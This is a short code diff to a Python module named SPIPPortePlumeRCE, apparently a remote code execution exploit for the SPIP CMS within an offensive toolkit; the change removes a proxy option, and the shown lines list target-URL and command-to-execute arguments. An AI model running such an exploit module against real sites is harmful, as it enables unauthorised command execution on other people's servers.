@@ -21,11 +21,10 @@ class SPIPPortePlumeRCE(Module):
 
     module_args = [
         Argument("url", desc="SPIP target URL (e.g. http://example.org)"),
-        Argument("proxy", "-p", "--proxy", desc="Proxy (e.g., http://127.0.0.1:8080)", default=None),
         Argument("cmd", "-c", "--cmd", desc="Command to execute", default="id")
     ]
 
-    async def execute(self, url: str, proxy: str, cmd: str):
+    async def execute(self, url: str, cmd: str):
 
         if not url.startswith(('http://', 'https://')):
             url = 'http://' + url
@@ -53,7 +52,6 @@ class SPIPPortePlumeRCE(Module):
                 url=full_url,
                 headers=headers,
                 data=data,
-                proxy=proxy
             )
 
             if not response:
